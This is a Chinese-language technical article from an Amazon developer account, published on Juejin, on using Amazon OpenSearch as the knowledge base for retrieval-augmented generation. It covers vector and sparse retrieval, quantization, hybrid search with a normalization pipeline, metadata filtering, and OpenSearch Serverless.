<strong>最后更新</strong>：2024年<br/>
<strong>作者</strong>：基于实际项目经验总结</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Amazon OpenSearch 助力高效 RAG 系统落地]]></title>    <link>https://juejin.cn/post/7575757258832887834</link>    <guid>https://juejin.cn/post/7575757258832887834</guid>    <pubDate>2025-11-24T02:54:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258832887834" data-draft-id="7575456858427097134" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Amazon OpenSearch 助力高效 RAG 系统落地"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-11-24T02:54:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="亚马逊云开发者"/> <meta itemprop="url" content="https://juejin.cn/user/2850395271209496"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Amazon OpenSearch 助力高效 RAG 系统落地
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2850395271209496/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    亚马逊云开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:54:17.000Z" title="Mon Nov 24 2025 02:54:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读29分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>随着生成式 AI 的快速发展，检索增强生成（Retrieval Augmented Generation，RAG）已成为构建高质量 AI 应用的关键技术。RAG 通过将大型语言模型（LLM）与外部知识库相结合，有效解决了 LLM 的幻觉问题，提高了回答的准确性和可靠性。</p>
<p>在众多RAG解决方案中，知识库作为核心组件至关重要。Amazon OpenSearch凭借其卓越的全文检索能力、语义搜索支持和高度可扩展的分布式架构，已成为企业构建高性能RAG知识库的首选技术平台，能够有效应对海量数据检索的挑战。</p>
<p>本文将深入探讨 Amazon OpenSearch 在 RAG 场景中的独特优势，并结合 Amazon Bedrock 生态系统，展示如何构建快速构建可扩展的 RAG 应用。我们还将介绍 Amazon OpenSearch 的 Serverless 版本的特性，以及如何使用 Serverless 架构进一步简化 RAG 解决方案的部署和管理。</p>
<blockquote>
<p>📢限时插播：无需管理基础设施，利用亚马逊技术与生态，快速集成与部署生成式AI模型能力。</p>
<p>✨ 精心设计，旨在引导您深入探索Amazon Bedrock的模型选择与调用、模型自动化评估以及安全围栏(Guardrail)等重要功能。</p>
<p>⏩快快点击进入《<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_InfoQhead_0606%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_InfoQhead_0606" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_InfoQhead_0606&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_InfoQhead_0606" ref="nofollow noopener noreferrer">多模一站通 —— Amazon Bedrock 上的基础模型初体验</a>》实验构建无限, 探索启程！</p>
</blockquote>
<h2 data-id="heading-0">RAG常规流程</h2>
<p>RAG 工作流程主要包含五个关键步骤：</p>
<p>1、数据准备（<strong>Data Preparation</strong>）</p>
<ol>
<li>将外部知识库中的文档、表格或其他数据进行预处理，转成适合构建知识库的格式，如文本、稠密/稀疏向量表示。</li>
<li>通过ETL（提取Extract、转换Transform、加载Load）过程清洗和整理数据，也可能会涉及到文档切分，并对每个数据块进行处理（例如向量化、分词、稀疏索引化等），存储到知识库中（例如Amazon OpenSearch），方便后续快速检索</li>
</ol>
<p>2、检索（<strong>Retrieval</strong>）</p>
<ol>
<li>用户输入查询后，系统将查询进行处理，例如查询改写、分词、转为向量表示等</li>
<li>检索器使用检索索技术（例如文本检索、向量检索等）从向量数据库中找到与查询最相关的文档片段或数据块。</li>
<li>检索不仅依赖关键词匹配，还采用语义级别的匹配，确保对复杂或模糊查询也能找到准确的支持信息</li>
</ol>
<p>3、增强（<strong>Augmentation</strong>）</p>
<ol>
<li>将检索到的相关文档片段与用户查询结合，形成增强的提示（prompt）。</li>
<li>这个增强的提示通常通过模板或特定格式组织，确保生成模型能够充分利用检索信息，提供更丰富且上下文相关的输入</li>
</ol>
<p>4、生成（<strong>Generation</strong>）</p>
<ol>
<li>生成模型（如Claude、GPT等系列的大型语言模型）接收增强后的提示，生成自然语言回答。</li>
<li>生成的内容不仅语言流畅，还基于外部知识库的信息，保证回答的准确性和权威性。</li>
</ol>
<p>5、多轮交互与反馈（可选）</p>
<ol>
<li>在对话系统中，RAG支持多轮交互，每轮的查询和生成结果可以作为下一轮的输入。</li>
<li>系统根据用户反馈不断优化检索和生成策略，提升回答质量和用户体验</li>
</ol>
<p>Amazon OpenSearch 作为一个功能全面的搜索和分析引擎，为构建 RAG知识库提供了全面的支持。它不仅支持传统的全文搜索，还提供了稠密与稀疏向量搜索能力，使其成为构建 RAG 应用的理想选择。</p>
<h2 data-id="heading-1">Amazon OpenSearch 在 RAG 中的核心优势</h2>
<p>1、 强大的向量检索能力</p>
<p>Amazon OpenSearch 提供强大的 ANN（Approximate Nearest Neighbor，近似最近邻）检索能力，这得益于其深度集成的 KNN 插件。该插件支持多种先进的ANN算法实现，包括 HNSW（Hierarchical Navigable Small World）、IVF（Inverted File），以及 Faiss、NMSLIB 和 Lucene 等高效搜索库。这些算法和库提供了不同的优化路径，使得用户可以根据具体的应用场景精细调整参数配置，以达到检索速度与准确率之间的最优平衡。</p>
<p>利用 <code>method</code> 参数配置项，开发者可以精确指定所使用的算法类型（例如 HNSW 或 IVF）、向量空间度量标准（如 L2 范数、内积、余弦相似性等），以及特定引擎的具体参数设置。这种灵活性确保了不同应用场景下对性能和效果的不同需求都能得到满足。对于希望深入了解 Amazon OpenSearch 中 KNN/ANN 功能及其参数配置的用户，官方文档[1]提供了详尽的技术说明和指导。</p>
<p>在向量检索能力方面，Amazon OpenSearch 展现出了卓越的性能与高度可扩展的架构，能够高效支持从数百万到数十亿级别甚至百亿级的向量数据快速检索。这种灵活的扩展性使其能够适应从小规模实验到大规模生产环境的各种应用场景。根据 Amazon 官方发布的测试数据[2]，在使用行业广泛认可的 BIGANN 数据集（包含 10 亿个 128 维向量）进行的实验中，OpenSearch 在保证召回率达到 99% 的前提下，展现出极为优异的响应延迟表现：p50 延迟仅为 23.1 毫秒，p90 延迟为 27.1 毫秒，p99 延迟也仅上升至 32.2 毫秒。</p>
<p>这样的低延迟、高召回率的表现，充分体现了 Amazon OpenSearch 在向量检索领域的强大技术实力。无论是推荐系统、图像检索、语义搜索，还是其他对实时性和准确度有较高要求的 AI 应用场景，OpenSearch 都能够提供稳定、可靠且高效的底层支撑，足以应对绝大多数对性能敏感的业务需求。</p>
<p>2、向量量化技术降低成本</p>
<p>随着向量数据规模的迅速增长，尤其是在数据量达到千万甚至亿级别以上的场景中，传统基于内存的近似最近邻（ANN）算法（如 HNSW）在性能方面面临挑战：由于所有向量必须常驻内存，系统的内存消耗迅速攀升，导致向量检索的硬件成本和扩展难度显著增加。</p>
<p>为了解决这一问题，Amazon OpenSearch 在向量检索场景中引入了量化（Quantization）技术。通过对高维浮点向量进行压缩，OpenSearch 能在显著降低存储和计算资源消耗的同时，保持较高的检索准确率和响应速度。</p>
<p>其中，Binary Quantization（BQ，二进制量化） 是 OpenSearch 提供的一种高效向量压缩方案，特别适用于如 LLM Agent Memory 构建、语义搜索、推荐系统等大规模向量检索应用。BQ 技术将原始的高维浮点向量压缩为低位二进制表示，支持将每个向量维度编码为 1、2 或 4 位，分别对应约 32 倍、16 倍和 8 倍的压缩率，从而大幅度降低内存占用。此外，BQ 在 OpenSearch 中的训练与索引构建过程是自动完成的，用户无需单独进行预处理或模型训练，这大大简化了向量检索系统的开发和运维流程。尽管量化压缩本质上会带来一定的精度损失，但 OpenSearch 在实现 BQ 功能时，提供了灵活的参数配置，使用户可以在召回率、准确率与系统成本之间进行有效权衡。在实际生产环境中，OpenSearch 能够在资源利用率与检索效果之间实现平衡，满足各类企业级应用的性能需求。</p>
<p>在过去某客户测试案例中，面对亿级规模向量数据集，OpenSearch 采用 HNSW 算法结合 Binary Quantization 技术，在保持 1500 QPS 高并发的同时，P50、P90、P99 均在百毫秒内。与未使用量化的系统相比，整体成本降低约 50%，这充分证明了 BQ 技术在高性能、低成本向量检索中的实用价值。</p>
<p>在应用 BQ 量化时，有如下经验可以分享：</p>
<ol>
<li>shard 数量并不是越多越好，基于总体数据量，预估每个 shard 数据量，30GB左右是一个比较合适的值</li>
<li>首批数据写入后，做 force merge，提升后续的检索效果</li>
<li>使用最新版本的7g 实例系列（例如 c7g）</li>
<li>在需要高 QPS 的情况下，使用 C系列机器</li>
</ol>
<p>3、 混合搜索：结合语义和关键词搜索</p>
<p>在 RAG 场景下，混合检索 + 重排序的流程已经几乎是一个业内标准，用来提升知识召回效果。混合检索结合了关键词搜索（如 BM25）和语义搜索（如向量检索）的优点，弥补了各自的不足，从而提高了检索的准确性和效率。关键词搜索在精确匹配方面表现出色，适用于特定术语的检索；而语义搜索基于数据语义进行搜索，对拼写错误和同义词具有一定的鲁棒性，能够捕捉到更广泛的上下文信息。通过将这两种搜索方式融合，可以显著提升检索结果的相关性和多样性。</p>
<p>在混合检索得到多个相关结果后，如何从中选择最相关、最有价值的信息进行生成，是另一个需要解决的问题。这时，重排序模型（Rerank模型）就发挥了重要作用。重排序模型通过对不同检索模型返回的文档片段列表和用户问题语义匹配度进行重新排序，改进检索返回的结果。它计算用户问题与检索召回的每一个候选文档之间的相关性分数，并返回按照相关性排序的文档列表。这样，模型在生成过程中就可以优先选择高质量的信息，从而提高生成结果的准确性和可靠性。常见的重排序模型包括 Cohere Rerank、BGE-Reranker 等。这些模型可以在单路或多路的召回结果中挑选出和问题最接近的文档，进一步提升生成答案的精确度。</p>
<p>在构建混合搜索（如向量检索 + 关键词检索）系统时，通常需要解决以下两个关键问题：</p>
<p>查询向量化处理复杂：用户输入通常为自然语言文本，这就要求系统既要对文本进行分词处理以支持关键词检索，又要通过嵌入模型将其向量化以支持语义检索。这一过程涉及模型加载与推理，增加了系统的处理复杂度。相关性分数尺度不一致：关键词检索（如 BM25）和语义检索（如向量匹配）返回的相关性分数处于不同的评分体系中，直接融合可能导致评分失衡。因此，必须对它们进行标准化处理，将结果统一到可比较的评分尺度。Amazon OpenSearch 的一大优势在于，其原生支持混合检索，能够轻松集成语义搜索与关键词搜索。它不仅支持灵活对接外部嵌入模型，还提供了内置机制（如搜索管道和标准化处理器）用于调整不同检索通路的权重和相关性分数的统一，大幅简化了混合搜索系统的构建与优化过程。</p>
<h4 data-id="heading-2">3.1. 集成嵌入模型</h4>
<p>在向量数据库中，无论是文本的写入还是检索，都需要先将文本转换为对应的向量表示。因此，向量化模型的部署是实现语义检索的关键步骤。在亚马逊云平台上，主要有两种方式可以实现向量化模型的集成：</p>
<ol>
<li>使用 <strong>Amazon Bedrock</strong> 提供的内置向量化模型：Amazon Bedrock 支持多种主流的向量化模型，例如 Cohere 和 Amazon Titan（稠密向量模型）。通过直接调用 Bedrock 提供的 API，即可实现文本的向量化处理，无需自行部署模型。</li>
<li>通过 <strong>Amazon SageMaker</strong> 部署自定义向量化模型：支持将如 bge-m3 等开源嵌入模型部署到 SageMaker 平台，部署后即可通过 SageMaker Endpoint 实现模型的调用和推理，适用于需要定制或优化模型的场景。</li>
</ol>
<p>对于上述两种方式，Amazon OpenSearch 都提供了统一的对接能力：可以将这两类模型的推理服务抽象为一个“连接器”（Connector）进行调用。在 OpenSearch 中，通过连接器可以直接调用模型进行文本嵌入推理，并结合工作流自动化机制，将推理结果写入索引或用于实时的向量检索，从而实现端到端的语义索引流程。</p>
<p>整个配置过程支持图形化操作，部署简单、流程清晰。具体的配置步骤和使用示例，可参考文档 [4]。</p>
<h4 data-id="heading-3">3.2. hybrid检索</h4>
<p>在 Amazon OpenSearch 中，实现混合检索（例如将关键词检索与向量检索相结合）非常简便，可以通过配置 OpenSearch 的自动化搜索工作流来完成。其中，第一步通常是配置一个包含归一化处理器（Normalization Processor）的搜索管道（Search Pipeline），其主要目的是对来自不同检索通路（如 BM25 和向量搜索）的相关性分数进行标准化处理。</p>
<p>由于关键词搜索与语义搜索返回的分值通常处于不同的尺度，若不进行归一化处理，融合后的排序可能会严重偏向某一路结果。通过归一化处理器，可以将多路查询结果的分数映射到统一的数值范围（如 [0, 1]），从而确保后续的结果融合更加合理和可控。</p>
<pre><code class="hljs language-bash" lang="bash">PUT /_search/pipeline/nlp-search-pipeline
{
  <span class="hljs-string">"description"</span>: <span class="hljs-string">"Post processor for hybrid search"</span>,
  <span class="hljs-string">"phase_results_processors"</span>: [
    {
      <span class="hljs-string">"normalization-processor"</span>: {
        <span class="hljs-string">"normalization"</span>: {
          <span class="hljs-string">"technique"</span>: <span class="hljs-string">"min_max"</span>
        },
        <span class="hljs-string">"combination"</span>: {
          <span class="hljs-string">"technique"</span>: <span class="hljs-string">"arithmetic_mean"</span>,
          <span class="hljs-string">"parameters"</span>: {
            <span class="hljs-string">"weights"</span>: [
              0.3,
              0.7
            ]
          }
        }
      }
    }
  ]
}
</code></pre>
<ul>
<li>normalization.technique：可选值包括 min-max、l2 用于标准化分数。</li>
<li>combination.technique：可选值包括 arithmetic_mean、geometric_mean、harmonic_mean 等，用于组合分数。</li>
</ul>
<p>您还可以为每个查询子句设置权重，以调整其对最终评分的影响。在配置好模型连接器和搜索管道后，即可直接运行混合检索：</p>
<pre><code class="hljs language-perl" lang="perl">GET /<span class="hljs-keyword">my</span>-nlp-<span class="hljs-keyword">index</span>/_search?search_pipeline=nlp-search-pipeline
{
  <span class="hljs-string">"_source"</span>: {
    <span class="hljs-string">"exclude"</span>: [
      <span class="hljs-string">"passage_embedding"</span>
    ]
  },
  <span class="hljs-string">"query"</span>: {
    <span class="hljs-string">"hybrid"</span>: {
      <span class="hljs-string">"queries"</span>: [
        {
          <span class="hljs-string">"match"</span>: {
            <span class="hljs-string">"passage_text"</span>: {
              <span class="hljs-string">"query"</span>: <span class="hljs-string">"Hi world"</span>
            }
          }
        },
        {
          <span class="hljs-string">"neural"</span>: {
            <span class="hljs-string">"passage_embedding"</span>: {
              <span class="hljs-string">"query_text"</span>: <span class="hljs-string">"Hi world"</span>,
              <span class="hljs-string">"model_id"</span>: <span class="hljs-string">"aVeif4oB5Vm0Tdw8zYO2"</span>,
              <span class="hljs-string">"k"</span>: <span class="hljs-number">5</span>
            }
          }
        }
      ]
    }
  }
}
</code></pre>
<p>可以看到，应用侧只需获取用户的文本输入，后续的关键词检索与语义检索即可在 Amazon OpenSearch 内部自动完成。整个过程无需额外开发复杂的检索逻辑，大幅降低了混合检索的实施成本与技术门槛。</p>
<p>4、丰富的过滤能力在基于 RAG 的应用中，具备基于元数据进行过滤与聚合的能力至关重要。通过元数据过滤，可以在向量搜索前显著缩小搜索空间，排除与用户查询意图无关的内容，从而提升生成结果的精度和相关性。</p>
<p>在实际应用中，结合元数据的检索是非常常见的需求。例如，在一个多用户共享的知识库系统中，不同用户只能访问和查询各自上传或被授权的数据内容，这就需要基于“用户 ID”或“组织标识”等元数据字段进行过滤，确保不同用户根据其权限仅访问其有权查看的数据，满足企业在数据安全和合规性方面的要求。同样，在某些特定的知识问答或问诊类场景中，仅需要检索与某个专业领域相关的文档，此时基于领域标签、文档来源等元数据进行预过滤，可以大幅减少无效数据的干扰。</p>
<p>在过滤维度方面，元数据过滤可以应用于多个常见维度。时间过滤允许系统仅在某个时间区间内进行文档搜索，比如只检索“2023 年第一季度”的数据；类别过滤可以限制检索范围在特定的产品线、项目组或业务单元内，避免跨部门数据混淆；来源过滤则帮助系统优先选择来自权威数据源的内容，比如会议纪要、技术手册、API 文档等。通过这些结构化过滤手段，可以在原始向量相似度排序基础上进一步精炼结果，提升整体系统的输出质量与稳定性。</p>
<p>对于一些复杂查询场景，尤其是在用户采用自然语言表达意图时，人工手动构造元数据过滤条件不仅繁琐，而且容易出现歧义或遗漏。为此，目前也有方案是结合大语言模型的能力，实现自动从用户输入中提取出与元数据相关的结构化查询条件。这种“智能元数据过滤”模式极大提升了检索过程的灵活性与适应性。例如，用户输入“展示 2022 年发布的 Project A 的相关文档”，系统可以自动解析出两个关键过滤字段：时间为 2022 年，项目为 Project A，并据此执行精准的文档向量检索，显著提升返回结果的针对性和命中率。</p>
<p>Amazon OpenSearch 提供了强大的元数据过滤能力，使得用户可以通过时间、类别、来源等元数据维度精准控制检索范围，有效提高系统整体的检索质量。它主要提供 3 种过滤方法[5]：</p>
<ol>
<li>高效 <strong>k-NN</strong> 过滤（<strong>Efficient k-NN Filtering</strong>）：自 OpenSearch 2.9 起，支持在向量检索过程中同时应用过滤条件，避免了传统的预过滤或后过滤方式可能导致的结果数量不足或性能下降的问题。这种方法确保在满足过滤条件的文档中返回准确的 k 个最近邻结果</li>
<li>布尔后过滤（<strong>Boolean Post-Filtering</strong>）：此方法在向量检索后应用过滤条件，适用于过滤条件不太严格的场景。但在过滤条件较严格时，可能导致返回的结果少于预期的 k 个</li>
<li>评分脚本过滤（<strong>Scoring Script Filtering</strong>）：此方法先对文档集应用过滤条件，然后在过滤后的子集上执行精确的 k-NN 检索。适用于对精度要求高的场景，但在处理大型数据集时可能面临高延迟和扩展性问题。</li>
</ol>
<p>需要注意的是，即使在大规模向量检索的应用场景中，也并非所有情况下都必须采用近似最近邻（ANN）检索。在某些特定场景下，预过滤（pre-filter）结合精确 k-NN 检索的方式，相较于 ANN 更具优势，既能降低资源成本，又能实现更高的召回率。</p>
<p>这类场景的典型特征是：尽管全局向量池的规模非常大（如千万级甚至上亿条向量），但在应用元数据过滤条件后，实际参与向量检索的数据子集相对较小（通常在几千到几万条之间）。在这种情况下，如果仍使用全局 ANN 索引（如 HNSW）并将其完全加载至内存以实现低延迟查询，将带来较高的内存开销。而采用 pre-filter + 精确 k-NN 的检索模式，则无需构建和维护大型 ANN 索引，显著降低了内存消耗。此外，在过滤后的数据集较小的情况下，即使采用暴力计算方式进行精确 k-NN 也不会产生明显的计算负担。这种方式既能确保检索结果的完整性（即 100% 召回），又避免了 ANN 引入的近似误差，对于对召回率要求较高的场景尤为适用。</p>
<p>在使用 Amazon OpenSearch 进行向量检索的实际客户案例中，已有多个项目选择了 pre-filter + 精确 k-NN 的方案。例如，在某个基于摄像头采集的画面进行向量检索的场景中，系统总共维护着约 1400 万条向量。尽管向量总量庞大，但每次检索前都会通过“设备 ID”以及其他业务相关字段进行预过滤，最终参与计算的向量规模通常仅为 3000 至 4000 条。在这种条件下，采用精确 k-NN 而非 ANN，不仅大幅降低了系统资源占用，同时还能确保检索的召回率达到 100%，实现了更高的性价比。</p>
<p>5、稀疏向量检索能力稀疏向量检索（Sparse Vector Search）是一种结合了传统关键词匹配和神经网络语义理解的检索方法。它并非简单地替代关键词或稠密向量检索，而是是为了解决传统关键词检索和稠密向量检索各自的局限性，提升搜索的语义理解能力，同时兼顾计算效率和响应速度，在特定场景下提供更优的解决方案。或作为混合检索策略的一部分，与其他方法协同工作。</p>
<p>为什么需要稀疏向量检索？我们从目前关键词检索和稠密向量检索存在的挑战，以及稀疏向量如何解决的角度来看：</p>
<ul>
<li>关键词检索：传统关键词检索（基于倒排索引的词法搜索）依赖词汇匹配，难以处理词汇不匹配、同义词、多义词等语义问题，导致相关性不足。稀疏向量检索通过神经网络模型（如 SPLADE）将文本编码为高维稀疏向量，每个维度对应一个词或子词，并赋予权重。这种表示方式不仅保留了关键词的重要性，还引入了语义扩展能力，能够识别与查询相关的同义词或相关词汇，从而提高召回率。</li>
<li>稠密向量检索：稠密向量检索（Dense Vector Search）通过高维向量捕捉语义，但计算和存储开销较大，尤其在海量数据和高维度下，延迟和成本显著增加。Sparse Search 通过稀疏向量表示（只包含少量非零项及其权重），显著减少计算量和内存占用，同时保持较好的语义相关性。 这使得稀疏向量检索在处理大规模数据集时具有较高的效率，尤其适用于资源受限的环境。</li>
</ul>
<p>所以，稀疏向量检索是一种介于关键词检索和稠密向量检索之间的创新技术，旨在提升语义理解和检索效率。它既不是单纯替代关键词检索，也不是单纯替代稠密向量检索，而是作为两者的有效补充，帮助构建更高效、更准确的搜索系统。</p>
<p>Amazon OpenSearch 自 2.11 版本起引入了神经稀疏检索（Neural Sparse Search）功能，为语义搜索提供了一种高效、低资源消耗的替代方案。稀疏向量检索结合了传统倒排索引的高性能和神经网络模型的语义理解能力，特别适用于对召回率、可解释性和成本控制有较高要求的场景。在这个过程中，文本首先通过稀疏编码模型（如 OpenSearch 提供的预训练模型）转换为稀疏向量，即由非零权重的 token:weight 键值对组成的向量。这些向量被索引到 Lucene 的倒排索引中，利用<code>FeatureField</code>存储结构。查询时，输入文本同样被编码为稀疏向量，并通过倒排索引进行匹配和打分，从而实现语义级的检索[6]。</p>
<p>目前 Amazon OpenSearch 支持两种稀疏检索模式：</p>
<ul>
<li><strong>Doc-only</strong> 模式：仅在索引阶段对文档进行语义扩展，查询阶段不进行扩展。该模式延迟低，性能接近传统 BM25 检索，适用于对响应速度要求高的场景</li>
<li><strong>Bi-encoder</strong> 模式：在索引和查询阶段均进行语义扩展，能够更全面地捕捉查询意图，提高检索相关性，但相应地计算开销和延迟也更高</li>
</ul>
<p>在 Amazon OpenSearch 中使用稀疏向量检索的操作非常简便，其配置流程与第 3.1 节所介绍的步骤基本一致。根据官方发布的测试结果[7]，稀疏与稠密向量结合的混合检索方法在整体检索效果上优于传统 BM25 与稠密向量的组合。然而，需要特别注意的是，稀疏向量检索的性能高度依赖于所使用的稀疏编码器（Sparse Encoder）模型的质量。如果模型在扩展词汇上的语义相关性较弱，将直接影响最终的召回能力。</p>
<p>此外，由于大多数稀疏编码器是在通用语料上进行预训练的，在面对特定垂直领域中的专业术语时，其召回效果可能甚至不如传统的关键词匹配。这意味着在特定业务场景中，是否适合使用稀疏检索仍需结合实际数据进行评估。必要时，可能还需对稀疏编码器进行微调，以优化其在目标领域中的检索效果。</p>
<h2 data-id="heading-4">Amazon OpenSearch Serverless</h2>
<p>除了传统的集群部署模式，Amazon OpenSearch 还提供了 Serverless 模式，具备无需运维、自动弹性扩缩的优势，为向量存储与检索提供了一种高效便捷的解决方案。OpenSearch Serverless 是专为生成式人工智能（Generative AI）和检索增强生成（RAG）应用设计的无服务器向量数据库，具备高性能、可扩展的向量检索能力，能够在毫秒级延迟内完成搜索，适用于语义搜索、推荐系统、聊天机器人等多种智能应用场景。</p>
<p>其核心优势在于完全托管的无服务器架构，用户无需预置、配置或管理底层集群资源。系统会根据实际负载自动完成资源的扩展与回收，在访问模式或应用需求波动时，依然能够保持高吞吐率和低延迟响应。同时，OpenSearch Serverless 与 Amazon S3 深度集成，具备与 S3 相同级别的数据持久性，确保数据的高可用与强一致性。</p>
<p>在 RAG 应用中，OpenSearch Serverless 支持向量检索与文本关键词检索的无缝融合，进一步提升语义相关性的匹配效果。它内置与传统集群模式一致的近似最近邻（ANN）算法，例如 HNSW（分层可导航小世界图），可在大规模向量数据集上实现快速、准确的相似性搜索。借助与 Amazon Bedrock 的原生双向集成，OpenSearch Serverless 可与如 Amazon Titan Embeddings 等基础模型无缝协作，简化嵌入生成、检索调用等 RAG 工作流开发流程。</p>
<p>在安全方面，OpenSearch Serverless 原生集成 Amazon Identity and Access Management（IAM），支持细粒度的权限控制，同时支持通过 Amazon Key Management Service（KMS）进行数据加密，确保数据在传输与存储过程中的完整性与机密性。</p>
